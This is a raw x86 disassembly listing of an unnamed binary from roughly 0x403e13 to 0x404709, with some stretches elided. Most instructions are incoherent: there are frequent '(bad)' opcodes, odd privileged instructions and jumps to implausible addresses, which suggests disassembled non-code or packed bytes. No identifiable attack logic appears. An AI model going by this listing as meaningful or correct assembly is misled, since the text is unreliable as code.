  403e13:	lods   al,BYTE PTR ds:[esi]
  403e14:	mov    bl,0xa5
  403e16:	add    dh,BYTE PTR [edx+0x41]
  403e19:	mov    bh,0x88
  403e1b:	and    al,0x2a
  403e1d:	push   ds
  403e1e:	aas    
  403e1f:	pop    ebx
  403e20:	xchg   DWORD PTR [edx-0x55c81702],ecx
  403e26:	jge    0x403dcc
  403e28:	dec    DWORD PTR ds:0xa3316a11
  403e2e:	add    dh,BYTE PTR [ebp+edi*8+0x3f12f25]
  403e35:	pop    edx
  403e36:	push   es
  403e37:	adc    ch,cl
  403e39:	int    0x0
  403e3b:	push   ss
  403e3c:	cmp    DWORD PTR [edi+0xb27d9a],ebx
	...
  403e56:	enter  0x6ab0,0xac
  403e5a:	shl    BYTE PTR [esi],0xeb
  403e5d:	sahf   
  403e5e:	xchg   ebx,eax
  403e5f:	jnp    0x403e61
  403e61:	lods   al,BYTE PTR ds:[esi]
  403e62:	clc    
  403e63:	sbb    edx,DWORD PTR [eax]
  403e65:	pop    esp
  403e66:	pop    esi
  403e67:	mov    dl,0x50
  403e69:	cmp    al,BYTE PTR [ebx-0x59]
  403e6c:	mov    eax,0xf883a4e9
  403e71:	(bad)  
  403e72:	iret   
  403e73:	cli    
  403e74:	push   edx
  403e75:	shl    DWORD PTR [ebp+0x6b],0x0
  403e79:	jmp    0xaacc0bf7
  403e7e:	jmp    0xa526013c
  403e83:	push   ebp
  403e84:	mov    edi,DWORD PTR [ebp+0x248357d1]
  403e8a:	mov    ebx,0xccf27502
  403e8f:	add    DWORD PTR [eax],eax
  403e91:	jmp    0xa09b8e3a
  403e96:	(bad)  
  403e97:	(bad)  
  403e98:	push   DWORD PTR [ecx+0x77]
  403e9b:	(bad)  
  403e9c:	mov    edx,0x2a4e9
  403ea1:	add    ebp,DWORD PTR [ebx-0x32268a51]
  403ea7:	scas   eax,DWORD PTR es:[edi]
  403ea8:	jne    0x403e9b
  403eaa:	cmp    al,0x73
  403eac:	mov    eax,0xc085a4e9
  403eb1:	xlat   BYTE PTR ds:[ebx]
  403eb2:	mov    eax,0x5e00f803
  403eb7:	adc    al,BYTE PTR [ebx+0xc4]
	...
  403ecd:	add    BYTE PTR [eax],al
  403ecf:	xchg   esp,eax
  403ed0:	add    dh,BYTE PTR [ebp-0x1a]
  403ed3:	mov    DWORD PTR [ecx],eax
  403ed5:	add    cl,ch
  403ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ed8:	fwait
  403ed9:	add    al,BYTE PTR [edx-0x26]
  403edc:	jnp    0x403ea1
  403ede:	(bad)  
  403edf:	jno    0x403e9a
  403ee1:	ret    0xa4ed
  403ee4:	push   ebp
  403ee5:	mov    eax,DWORD PTR ds:0xff4c72b
  403eeb:	adc    eax,0x4300ffb0
  403ef0:	scas   eax,DWORD PTR es:[edi]
  403ef1:	mov    es,WORD PTR [ebp-0x8d4e]
  403ef7:	cmp    DWORD PTR [edx-0x8],0x71b9fe
  403efe:	add    BYTE PTR [esi+0x7a85c703],cl
  403f04:	je     0x403f05
  403f06:	(bad)  
  403f07:	jg     0x403f0c
  403f09:	add    BYTE PTR [eax],al
  403f0b:	jmp    0x403e94
  403f0d:	add    bh,bh
  403f0f:	imul   esi,DWORD PTR [ecx-0x1],0x827675
  403f16:	lea    eax,[ebx]
  403f18:	imul   edi,esi,0xffffffff
  403f1b:	cmp    DWORD PTR [esi+0x6a],edx
  403f1e:	add    BYTE PTR [esi+eax*1+0x743a858d],dh
  403f25:	(bad)  
  403f26:	dec    DWORD PTR [esi-0x5517fff0]
  403f2c:	push   ds
  403f2d:	add    BYTE PTR [eax],al
  403f2f:	int    0x5e
  403f31:	push   DWORD PTR [eax+eax*1+0x0]
	...
  403f45:	add    BYTE PTR [eax],al
  403f47:	add    BYTE PTR [edx-0x52],al
  403f4a:	mov    edi,0xbfb64275
  403f4f:	jmp    0x403f94
  403f51:	sbb    eax,DWORD PTR [ecx]
  403f53:	add    BYTE PTR [esi],cl
  403f55:	add    ecx,ecx
  403f57:	ret    0x316
  403f5a:	push   ebp
  403f5b:	mov    ebp,DWORD PTR [edx-0x7b]
  403f5e:	(bad)  
  403f5f:	cld    
  403f60:	dec    ebp
  403f61:	into   
  403f62:	fisubr DWORD PTR [edx+0x44]
  403f65:	jb     0x403fdc
  403f67:	or     BYTE PTR [esi+0x2f],dl
  403f6a:	(bad)  
  403f6b:	(bad)  
  403f6c:	mov    ecx,0x1274bfad
  403f71:	or     eax,0xab43ff5a
  403f76:	out    0x7f,eax
  403f78:	mov    ecx,0xa70bff71
  403f7d:	fnstenv [esi]
  403f7f:	add    bh,BYTE PTR [esp+eiz*2-0x65b2ffe3]
  403f86:	jle    0x403fcd
  403f88:	mov    eax,0x9f75b088
  403f8d:	add    DWORD PTR [edi],eax
  403f8f:	mov    eax,0xc08699a7
  403f94:	and    DWORD PTR [edi*2+0x46e3b345],ecx
  403f9b:	call   FWORD PTR [edx]
  403f9d:	call   0x8aff:0xf71c0174
  403fa4:	xchg   ebp,eax
  403fa5:	push   ecx
  403fa6:	add    al,0x6a
  403fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa9:	push   ds
  403faa:	inc    esi
  403fab:	inc    DWORD PTR [eax]
	...
  403fc1:	xlat   BYTE PTR ds:[ebx]
  403fc2:	je     0x403ffa
  403fc4:	or     al,0x68
  403fc6:	or     dl,BYTE PTR [edi+edi*8]
  403fc9:	fidiv  DWORD PTR [edi-0x72844765]
  403fcf:	mov    al,0x3b
  403fd1:	jmp    0x86a8:0x3c0235ab
  403fd8:	fstp   TBYTE PTR [ebx-0x233c83a9]
  403fde:	jb     0x403fa5
  403fe0:	adc    al,0xa7
  403fe2:	push   cs
  403fe3:	jge    0x403fd1
  403fe5:	es push 0x2520f803
  403feb:	push   esp
  403fec:	sub    edi,esp
  403fee:	ror    DWORD PTR [ebp-0x1],1
  403ff1:	call   0xb03d:0x8189ba3
  403ff8:	or     esp,edi
  403ffa:	outs   dx,DWORD PTR ds:[esi]
  403ffb:	sub    BYTE PTR [edx+0x5d],ch
  403ffe:	in     al,dx
  403fff:	xor    eax,0xb0a1ff08
  404004:	(bad)  
  404005:	call   0xa5b603aa
  40400a:	add    dl,BYTE PTR [edx]
  40400c:	pop    eax
  40400d:	es xor cl,bh
  404010:	add    ebx,DWORD PTR [edi-0x5fc616fe]
  404016:	push   0xffffffe9
  404018:	sti    
  404019:	shr    BYTE PTR [ebp+0x482c0412],0xd9
  404020:	sbb    eax,0x866452a7
	...
  404039:	add    BYTE PTR [edi-0x8501156],ah
  40403f:	lods   eax,DWORD PTR ds:[esi]
  404040:	pop    esp
  404041:	cld    
  404042:	sub    BYTE PTR [ecx],0x96
  404045:	add    al,0xa7
  404047:	xchg   DWORD PTR [ecx-0x2665ad3],ebp
  40404d:	cmp    BYTE PTR [ecx+eax*2+0x79e8e7d2],ah
  404054:	adc    al,0x0
  404056:	sbb    al,0x10
  404058:	inc    ebx
  404059:	add    al,0xd7
  40405b:	jg     0x4040c1
  40405d:	add    al,0x5f
  40405f:	lods   eax,DWORD PTR ds:[esi]
  404060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404061:	push   esp
  404062:	pop    eax
  404063:	aaa    
  404064:	in     eax,dx
  404065:	scas   al,BYTE PTR es:[edi]
  404066:	cmc    
  404067:	adc    dh,BYTE PTR [ecx]
  404069:	fucom  st(3)
  40406b:	adc    ch,BYTE PTR [edx+0x31]
  40406e:	xchg   edi,eax
  40406f:	add    bh,ah
  404071:	add    ah,ah
  404073:	cdq    
  404074:	in     eax,0x88
  404076:	dec    esp
  404077:	ss push eax
  404079:	jnp    0x4040df
  40407b:	dec    ecx
  40407c:	mov    al,ds:0xbc02b3c2
  404081:	jp     0x40408e
  404083:	and    DWORD PTR ds:0x55f178ac,0x4e55a71a
  40408d:	cmp    DWORD PTR [edi-0x734e566],ebp
  404093:	lods   al,BYTE PTR ds:[esi]
  404094:	es dec ecx
  404096:	repz add DWORD PTR [eax],eax
  404099:	jmp    0x94cb4342
	...
  4040b2:	add    ah,bl
  4040b4:	ja     0x4040c8
  4040b6:	je     0x404126
  4040b8:	stos   BYTE PTR es:[edi],al
  4040b9:	push   eax
  4040ba:	xchg   ebx,eax
  4040bb:	test   al,0x7f
  4040bd:	inc    ebp
  4040be:	adc    eax,0xe175ad73
  4040c3:	adc    DWORD PTR [eax+0xc],edx
  4040c6:	scas   al,BYTE PTR es:[edi]
  4040c7:	and    ebp,DWORD PTR [edi]
  4040c9:	cld    
  4040ca:	in     al,dx
  4040cb:	scas   al,BYTE PTR es:[edi]
  4040cc:	std    
  4040cd:	or     DWORD PTR [ebp-0x52],edi
  4040d0:	jg     0x40414f
  4040d2:	icebp  
  4040d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d4:	xor    eax,0x98631ac9
  4040d9:	add    eax,0xc0806972
  4040de:	jmp    0x55a4:0xe5c2b9d9
  4040e5:	mov    edx,ebp
  4040e7:	and    eax,0xd81af4c7
  4040ec:	sbb    bl,BYTE PTR [eax-0x17fd5b0d]
  4040f2:	fimul  WORD PTR [eax]
  4040f4:	lods   al,BYTE PTR ds:[esi]
  4040f5:	push   DWORD PTR [eax-0x11]
  4040f8:	scas   al,BYTE PTR es:[edi]
  4040f9:	lea    esp,[edi+ecx*1]
  4040fc:	push   ebx
  4040fd:	call   0xffec9ed7
  404102:	fisubr DWORD PTR [ebp+0x19]
  404105:	push   ds
  404106:	adc    edi,DWORD PTR ds:0xa4830024
  40410c:	add    bh,bh
  40410e:	cld    
  40410f:	lock stos DWORD PTR es:[edi],eax
  404111:	jne    0x4040f4
  404113:	cmp    al,0x87
  404115:	(bad)  
  404116:	data16 add BYTE PTR [eax],al
	...
  404129:	add    BYTE PTR [eax],al
  40412b:	add    BYTE PTR [ecx-0x7a],cl
  40412e:	shr    dh,0x28
  404131:	repz add cl,ch
  404134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404135:	stos   DWORD PTR es:[edi],eax
  404136:	jne    0x40418d
  404138:	sbb    al,0x7f
  40413a:	fild   DWORD PTR [eax]
  40413c:	popa   
  40413d:	pop    esp
  40413e:	cmp    eax,0xffff6400
  404143:	jne    0x404140
  404145:	mov    ds,WORD PTR [ecx+eax*1]
  404148:	into   
  404149:	(bad)  
  40414a:	(bad)  
  40414b:	jne    0x404107
  40414d:	xchg   DWORD PTR [edx-0x1],ebx
  404150:	mov    cl,0x5c
  404152:	test   eax,eax
  404154:	sub    al,ah
  404156:	push   DWORD PTR [ebp-0x66]
  404159:	xchg   DWORD PTR [ebp-0x74a35e23],ecx
  40415f:	push   ebp
  404160:	mov    edx,0xbe6a1229
  404165:	pop    es
  404166:	xor    al,0x21
  404168:	mov    ?,edi
  40416a:	(bad)  
  40416b:	jne    0x4040ef
  40416d:	pop    ebp
  40416e:	jne    0x404164
  404170:	jno    0x4041c2
  404172:	or     al,0xc7
  404174:	mov    ebx,0x8e00005e
  404179:	jmp    DWORD PTR [edi+0x17]
  40417c:	xchg   edx,eax
  40417d:	aas    
  40417e:	add    bh,bh
  404180:	mov    ebx,0xe819e872
  404185:	push   es
  404186:	add    BYTE PTR [ebx+0x45],dl
  404189:	mov    edi,0x5ed53674
  40418e:	push   0x17
	...
  4041a3:	add    BYTE PTR [eax],al
  4041a5:	bound  eax,QWORD PTR [eax+0x0]
  4041a8:	call   0x406c5b
  4041ad:	dec    ebp
  4041ae:	push   edi
  4041af:	push   edi
  4041b0:	inc    edi
  4041b1:	mov    ch,0xbd
  4041b3:	mov    ecx,0xffff4f94
  4041b8:	scas   eax,DWORD PTR es:[edi]
  4041b9:	inc    ebx
  4041ba:	jno    0x40416a
  4041bc:	mov    eax,0xf7a
  4041c1:	mov    ch,0xbf
  4041c3:	mov    BYTE PTR [edi+0x71],0x6
  4041c7:	push   edi
  4041c8:	push   ebx
  4041c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ca:	inc    ecx
  4041cb:	mov    cl,0xb5
  4041cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ce:	cdq    
  4041cf:	jp     0x404216
  4041d1:	jmp    DWORD PTR [ebx-0x3b]
  4041d4:	inc    edi
  4041d5:	lock popf 
  4041d7:	dec    esp
  4041d8:	pop    ebx
  4041d9:	jg     0x4041d7
  4041db:	fild   WORD PTR [eax-0x59]
  4041de:	fdiv   QWORD PTR [esi]
  4041e0:	cld    
  4041e1:	iret   
  4041e2:	call   0x68e7425d
  4041e7:	clc    
  4041e8:	mov    edi,0xf8785d53
  4041ed:	dec    edi
  4041ee:	(bad)  
  4041ef:	fild   WORD PTR [eax-0x59]
  4041f2:	adc    ebp,esp
  4041f4:	mov    bl,0xa7
  4041f6:	cdq    
  4041f7:	add    al,bh
  4041f9:	push   eax
  4041fa:	pop    esp
  4041fb:	js     0x4041dc
  4041fd:	pop    esi
  4041fe:	push   eax
  4041ff:	adc    eax,DWORD PTR [eax]
  404201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404202:	mov    edi,esi
  404204:	icebp  
  404205:	inc    ecx
  404206:	fs xchg edi,eax
  404208:	adc    DWORD PTR [eax],eax
	...
  40421e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40421f:	fadd   st,st(0)
  404222:	imul   esp,ecx,0xcd000ac
  404228:	pushf  
  404229:	addr16 jne 0x404295
  40422c:	lods   al,BYTE PTR ds:[esi]
  40422d:	mov    edx,edx
  40422f:	retf   
  404230:	clc    
  404231:	rcr    ebx,1
  404233:	lahf   
  404234:	jp     0x404238
  404236:	dec    esp
  404237:	call   0xffac:0x7e56e853
  40423e:	call   0xb33f869c
  404243:	fmul   DWORD PTR [eax-0x1]
  404246:	mov    dl,0x27
  404248:	fwait
  404249:	and    eax,0x83ac2952
  40424e:	stos   BYTE PTR es:[edi],al
  40424f:	xor    eax,DWORD PTR [ebx]
  404251:	ja     0x4041fb
  404253:	pusha  
  404254:	inc    esi
  404255:	clc    
  404256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404257:	add    ch,cl
  404259:	arpl   WORD PTR [edi+0x8abd4a9],sp
  40425f:	xor    BYTE PTR [ebp-0x54],bl
  404262:	jp     0x40425e
  404264:	inc    eax
  404265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404266:	cli    
  404267:	test   eax,0xae7aac46
  40426c:	push   ecx
  40426d:	xchg   ch,cl
  40426f:	test   eax,0x3020f836
  404274:	jmp    0x40420e
  404276:	mov    esp,0xb83728fd
  40427b:	jge    0x404231
  40427d:	mov    bh,0x1c
  40427f:	adc    eax,0x3616
	...
  404294:	add    BYTE PTR [eax],al
  404296:	add    BYTE PTR [ebx-0x47486b57],dh
  40429c:	push   esp
  40429d:	mov    ebp,0xe42ae786
  4042a2:	push   0x3e902a6
  4042a7:	sub    al,0x4f
  4042a9:	cmc    
  4042aa:	ja     0x404261
  4042ac:	test   eax,0x5490b05c
  4042b1:	icebp  
  4042b2:	stos   BYTE PTR es:[edi],al
  4042b3:	adc    ah,BYTE PTR [edi-0x567a803f]
  4042b9:	into   
  4042ba:	jg     0x404320
  4042bc:	dec    ecx
  4042bd:	and    bh,BYTE PTR [ebp+0x50e8f665]
  4042c3:	sbb    al,0x96
  4042c5:	push   0xffffffc0
  4042c7:	pop    ss
  4042c8:	push   ecx
  4042c9:	sbb    bl,bh
  4042cb:	jge    0x4042e7
  4042cd:	jmp    0x91e993b5
  4042d2:	add    BYTE PTR [ebp-0x57],0x96
  4042d6:	jge    0x4042c2
  4042d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042d9:	add    DWORD PTR [edi+eax*4],eax
  4042dc:	add    ch,cl
  4042de:	fwait
  4042df:	scas   al,BYTE PTR es:[edi]
  4042e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042e1:	jle    0x40428e
  4042e3:	push   ds
  4042e4:	aas    
  4042e5:	add    BYTE PTR ds:0xe92002c3,bh
  4042eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042ec:	call   0xa489:0xa93c4b6c
  4042f3:	xor    BYTE PTR [edi+0x7d],0x29
  4042f7:	xchg   edx,eax
  4042f8:	out    0xff,al
  4042fa:	call   0x4042ff
	...
  40430f:	add    BYTE PTR [ebp+esi*8-0x3eaec541],ah
  404316:	inc    ebp
  404317:	sub    edi,edi
  404319:	test   al,0xff
  40431b:	jmp    0x2f148205
  404320:	lods   al,BYTE PTR ds:[esi]
  404321:	add    al,BYTE PTR [eax]
  404323:	cs data16 mov dl,0xff
  404327:	(bad)  
  404328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404329:	add    bh,bh
  40432b:	pushf  
  40432c:	or     BYTE PTR [ecx+0x45],bh
  40432f:	cmp    DWORD PTR [edi+ebp*1],ecx
  404332:	mov    ah,0x76
  404334:	xchg   si,ax
  404336:	lea    esp,[esp+eiz*8-0x5b1697af]
  40433d:	add    al,BYTE PTR [eax+0x75a7a483]
  404343:	icebp  
  404344:	sub    al,0x65
  404346:	mov    ah,0xe9
  404348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404349:	sti    
  40434a:	mov    edi,0x7d83a55d
  40434f:	mov    ecx,0xd0052da4
  404354:	add    eax,DWORD PTR cs:[eax]
  404357:	jmp    0xb6f081c1
  40435c:	lods   eax,DWORD PTR ds:[esi]
  40435d:	add    al,BYTE PTR [eax]
  40435f:	pop    esp
  404360:	out    0x72,eax
  404362:	push   eax
  404363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404364:	xchg   edi,eax
  404365:	pushw  0xa4e9
  404369:	add    al,BYTE PTR [eax+0x50c2e764]
  40436f:	or     DWORD PTR [edi+0x6e],0x0
	...
  404389:	ds test eax,0x874375bf
  40438f:	test   eax,0x8b040e00
  404394:	inc    ebp
  404395:	rol    cl,cl
  404397:	add    BYTE PTR [eax],al
  404399:	fidivr DWORD PTR [edi-0x15547]
  4043a0:	call   FWORD PTR [ebp-0x3e550c42]
  4043a6:	inc    edx
  4043a7:	sar    BYTE PTR [esi+edi*8],0x3
  4043ab:	add    bh,bh
  4043ad:	xor    ebx,DWORD PTR [eax]
  4043af:	pop    DWORD PTR [ebp+0x6a]
  4043b2:	les    eax,FWORD PTR [ebp-0x2c]
  4043b5:	mov    esp,edi
  4043b7:	(bad)  
  4043b8:	inc    DWORD PTR [ecx-0x36000fbe]
  4043be:	add    eax,DWORD PTR [eax]
  4043c0:	lea    edx,[ebx]
  4043c2:	les    edx,FWORD PTR [eax+0x6a]
  4043c5:	into   
  4043c6:	add    eax,0x1f33ff00
  4043cb:	call   0x43b601
  4043d0:	or     ecx,esi
  4043d2:	xlat   BYTE PTR ds:[ebx]
  4043d3:	add    eax,0xd40b83
  4043d8:	jne    0x404456
  4043da:	xchg   BYTE PTR [eax-0x1],ah
  4043dd:	repz pop edx
  4043df:	push   DWORD PTR [ebp+0x22]
  4043e2:	push   es
  4043e3:	xor    DWORD PTR [edi+ecx*8],ebp
  4043e6:	(bad)  
  4043e7:	(bad)  
  4043e8:	jne    0x404414
  4043ea:	xchg   dl,cl
  4043ec:	mov    bl,0x0
	...
  404402:	jle    0x404407
  404404:	add    esp,0x7e
  404407:	stos   BYTE PTR es:[edi],al
  404408:	mov    dh,0x45
  40440a:	ss dec esi
  40440c:	push   0x0
  40440e:	or     edi,edx
  404410:	sti    
  404411:	call   0x3f9c2e
  404416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404418:	ret    
  404419:	jne    0x4043c0
  40441b:	test   bh,ch
  40441d:	mov    dl,ch
  40441f:	inc    ecx
  404420:	test   eax,0x2590eb75
  404425:	mov    dl,0xa7
  404427:	cdq    
  404428:	push   ebx
  404429:	call   DWORD PTR [edx+0x4f75a8d5]
  40442f:	push   ecx
  404430:	dec    edi
  404431:	sti    
  404432:	or     BYTE PTR [eax-0x3],cl
  404435:	mov    edi,0x109c9b7a
  40443a:	clc    
  40443b:	int    0x13
  40443d:	(bad)  
  40443e:	jp     0x4043ed
  404440:	test   al,0x75
  404442:	das    
  404443:	push   ecx
  404444:	out    dx,eax
  404445:	cld    
  404446:	loopne 0x404437
  404448:	jl     0x404422
  40444a:	fsubr  DWORD PTR [ebp+0x6b]
  40444d:	call   0x4489f4
  404452:	enter  0x6f8d,0xe8
  404456:	xchg   edx,eax
  404457:	cli    
  404458:	test   al,0xff
  40445a:	mov    eax,0x8ae8678d
  40445f:	cli    
  404460:	test   al,0xff
  404462:	test   al,0x2d
  404464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404465:	call   0x40446a
	...
  40447a:	add    dl,al
  40447c:	cli    
  40447d:	test   al,0xff
  40447f:	sub    al,0xd9
  404481:	dec    esp
  404482:	pop    edi
  404483:	pop    esi
  404484:	pop    edx
  404485:	idiv   edi
  404487:	repz xor BYTE PTR [edi+0x7cd06b83],dl
  40448e:	inc    ebp
  40448f:	stos   DWORD PTR es:[edi],eax
  404490:	mov    al,ds:0x54a974c3
  404495:	add    eax,DWORD PTR [eax]
  404497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404498:	fwait
  404499:	add    eax,edi
  40449b:	jmp    0x769b:0xa700036f
  4044a2:	inc    ebp
  4044a3:	push   ebx
  4044a4:	add    edi,DWORD PTR [ecx]
  4044a6:	test   eax,0x2e9df6d2
  4044ab:	scas   eax,DWORD PTR es:[edi]
  4044ac:	call   0x266a:0xa638aa00
  4044b3:	xor    eax,DWORD PTR [ebx]
  4044b5:	std    
  4044b6:	adc    BYTE PTR [ebp-0x4cd181fe],bh
  4044bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044bd:	cld    
  4044be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044bf:	cmovge ebp,DWORD PTR [edi-0x58]
  4044c3:	adc    BYTE PTR [ebx+0x66],dl
  4044c6:	or     ebx,DWORD PTR cs:[ebx-0x59ff5cc7]
  4044cd:	mov    cl,0xba
  4044cf:	in     eax,0xfa
  4044d1:	call   0x6ad76124
  4044d6:	mov    edi,0x3e261ceb
  4044db:	jecxz  0x4044e0
  4044dd:	jmp    0x404503
	...
  4044f2:	add    BYTE PTR [eax],al
  4044f4:	loopne 0x404535
  4044f6:	das    
  4044f7:	or     DWORD PTR [edi+0x6276ed18],esp
  4044fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044fe:	mov    ecx,0xe903271b
  404503:	add    ecx,DWORD PTR [edi-0x5b]
  404506:	push   cs
  404507:	add    esp,DWORD PTR [edi-0x3f04835b]
  40450d:	xchg   ebx,eax
  40450e:	cmp    al,BYTE PTR [ebx]
  404510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404511:	mov    ebx,0x4e98ff2b
  404516:	bound  edx,QWORD PTR [edi+0x4f95be24]
  40451c:	hlt    
  40451d:	mov    ebp,0x2a75824
  404522:	jmp    0x4209f92a
  404527:	add    al,0x97
  404529:	add    ch,cl
  40452b:	fwait
  40452c:	push   cs
  40452d:	mov    ds:0x3f2ea7be,al
  404532:	add    BYTE PTR [ecx-0x16effd45],ch
  404538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404539:	call   0x2489:0xa500898c
  404540:	rcr    DWORD PTR [edx],cl
  404542:	add    cl,bh
  404544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404545:	add    ch,al
  404547:	push   cs
  404548:	or     esp,DWORD PTR [ebp+0x66e670ff]
  40454e:	(bad)  
  40454f:	cld    
  404550:	pusha  
  404551:	imul   edi,DWORD PTR [ecx+ebp*8],0xffffffa4
  404555:	add    dh,BYTE PTR [ebx]
  404557:	test   eax,0x0
	...
  40456c:	add    BYTE PTR [eax+ebx*2-0x39],dl
  404570:	lods   al,BYTE PTR ds:[esi]
  404571:	dec    eax
  404572:	out    0xff,al
  404574:	call   0x29b5eb1d
  404579:	jo     0x4045ba
  40457b:	aam    0x4e
  40457d:	mov    dh,0x6a
  40457f:	(bad)  
  404580:	lods   al,BYTE PTR ds:[esi]
  404581:	xor    al,0xbd
  404583:	inc    ebp
  404584:	and    DWORD PTR [eax],ecx
  404586:	cmc    
  404587:	(bad)  
  404588:	call   0x2f3484a6
  40458d:	fsub   DWORD PTR [edi+edi*8+0x50be6674]
  404594:	xchg   ecx,eax
  404595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404596:	add    al,BYTE PTR [eax]
  404598:	imul   ebx,DWORD PTR [ebp-0x536b00fe],0xa33bb59c
  4045a2:	add    cl,BYTE PTR [ebx]
  4045a4:	sub    edi,edx
  4045a6:	cld    
  4045a7:	xor    BYTE PTR [eax+ebp*2+0x3],0x75
  4045ac:	in     al,0x33
  4045ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045af:	add    cl,ch
  4045b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b2:	mov    ebx,0xf4499945
  4045b7:	(bad)  
  4045b8:	call   0x39f083bc
  4045bd:	dec    eax
  4045be:	cs mov esp,0xfffed600
  4045c4:	dec    esi
  4045c6:	sub    al,BYTE PTR [ebp-0x3c]
  4045c9:	mov    esi,0x3eb29086
  4045ce:	add    BYTE PTR [ebx],cl
  4045d0:	rol    BYTE PTR [eax],0x0
	...
  4045e3:	add    BYTE PTR [eax],al
  4045e5:	add    BYTE PTR [ebx+0x4ed8e901],ch
  4045eb:	add    BYTE PTR [eax],al
  4045ed:	mov    ecx,DWORD PTR [ebx+0x3e00c616]
  4045f3:	sub    edi,DWORD PTR [ebp-0x3c]
  4045f6:	out    0x9b,eax
  4045f8:	(bad)  
  4045f9:	dec    DWORD PTR [esi]
  4045fb:	mov    cl,0xbf
  4045fd:	repz fs fs inc ebp
  404601:	les    eax,FWORD PTR [edx+0x0]
  404604:	add    BYTE PTR [eax],al
  404606:	xor    edx,0x704b8fb7
  40460c:	mov    DWORD PTR [ebp-0x4a],0xfe000f5c
  404613:	fs inc ebp
  404615:	hlt    
  404616:	popa   
  404617:	lods   al,BYTE PTR ds:[esi]
  404618:	(bad)  
  404619:	call   DWORD PTR [ebx+0x42]
  40461c:	les    edx,FWORD PTR [eax-0x1c]
  40461f:	jmp    FWORD PTR [ecx+0x0]
  404622:	xor    edx,0x31fae8bb
  404628:	add    BYTE PTR [eax],al
  40462a:	mov    ch,0xbf
  40462c:	je     0x404634
  40462e:	dec    ebp
  40462f:	fcmovbe st,st(3)
  404631:	add    BYTE PTR [ebx],bl
  404633:	add    ebp,ecx
  404635:	mov    WORD PTR [esi+0x1bfeffff],?
  40463b:	adc    bh,bh
  40463d:	jne    0x40460d
  40463f:	pop    esp
  404640:	jne    0x4045fa
  404642:	mov    al,es:0x5e7e412a
  404648:	jne    0x404606
	...
  40465e:	add    BYTE PTR [esi-0x4b],dl
  404661:	mov    cl,0x0
  404663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404664:	cdq    
  404665:	add    ah,0x9b
  404668:	les    ebp,FWORD PTR [ebp+eax*2+0x4b]
  40466c:	or     DWORD PTR [edx],ebx
  40466e:	add    BYTE PTR [eax-0x12],ah
  404671:	ret    
  404672:	call   0xffe5b7d3
  404677:	pushf  
  404678:	pop    ecx
  404679:	das    
  40467a:	add    bh,BYTE PTR [ebx+edi*1]
  40467d:	jnp    0x4046c4
  40467f:	sti    
  404680:	sub    DWORD PTR [edi],0xffffffb4
  404683:	dec    edi
  404684:	cmp    ah,BYTE PTR [esi+0x2f7430ff]
  40468a:	mov    esp,0x74113f
  40468f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404690:	or     DWORD PTR [ebp+0x2f2c5b75],esp
  404696:	mov    ah,0xff
  404698:	push   cs
  404699:	stos   DWORD PTR es:[edi],eax
  40469a:	dec    DWORD PTR [eax]
  40469c:	mov    al,0xc3
  40469e:	jne    0x404645
  4046a0:	push   eax
  4046a1:	repz cmp BYTE PTR [edx-0x57],0x3
  4046a6:	je     0x404643
  4046a8:	xor    al,0x2f
  4046aa:	adc    al,ch
  4046ac:	gs idiv esi
  4046af:	pop    edx
  4046b0:	sub    eax,0xebde409c
  4046b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046b6:	or     esp,edi
  4046b8:	ins    DWORD PTR es:[edi],dx
  4046b9:	add    ebx,ebp
  4046bb:	mov    al,0x30
  4046bd:	int3   
  4046be:	or     ebx,esp
  4046c0:	mov    WORD PTR [edx],ss
  4046c2:	lea    eax,[eax]
	...
  4046d8:	bound  edi,QWORD PTR ds:0xad3aff54
  4046de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046df:	jne    0x4046d4
  4046e1:	adc    BYTE PTR [ebx],cl
  4046e3:	sti    
  4046e4:	mov    al,ds:0x98d878a1
  4046e9:	pop    ds
  4046ea:	outs   dx,DWORD PTR ds:[esi]
  4046eb:	call   0x442286
  4046f0:	mov    BYTE PTR [ebx],al
  4046f2:	pop    esp
  4046f3:	les    ecx,FWORD PTR [edi+0x78a4bdf4]
  4046f9:	mov    ds:0xc7f685c,al
  4046fe:	scas   al,BYTE PTR es:[edi]
  4046ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404700:	push   0x4f6c3ca2
  404705:	add    al,0x9e
  404707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404708:	pop    eax
  404709:	xchg   BYTE PTR [eax+ebx*2],dh
